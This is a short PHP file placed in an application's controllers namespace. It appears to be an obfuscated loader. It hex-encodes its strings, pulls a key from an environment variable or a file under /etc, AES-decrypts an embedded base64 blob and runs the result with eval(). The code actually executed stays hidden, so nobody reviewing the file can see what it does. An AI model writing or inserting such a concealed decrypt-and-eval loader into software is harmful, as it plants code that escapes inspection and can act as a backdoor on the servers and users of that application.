<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7f9f43t+qewskv05rk48/Q==');

$c=base64_decode(

'iE+0DpAkuD4mJC3bhzV50Wcpk5rPFEMlZC7/bFAqApMqhpRXvvLgb8PN4q0F0+cO20QiEkxKmmcG' .
'sw3dxnwlthCu+UP+PtQ7FeXWVx/Yka4GVzoNHE1q+Toh6a+qWVkmRxAMdeBuzm0JL5vpetz72wFd' .
'rilEf04UuSepkucpew9e7L/xA1L7N/9TTa5Yl98eLhlHttyusj+8D8BFAmwtoO6KLjSpfrOwF1HV' .
'lNvvAywq+8oTp3u7g33+9ZXgc68t'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

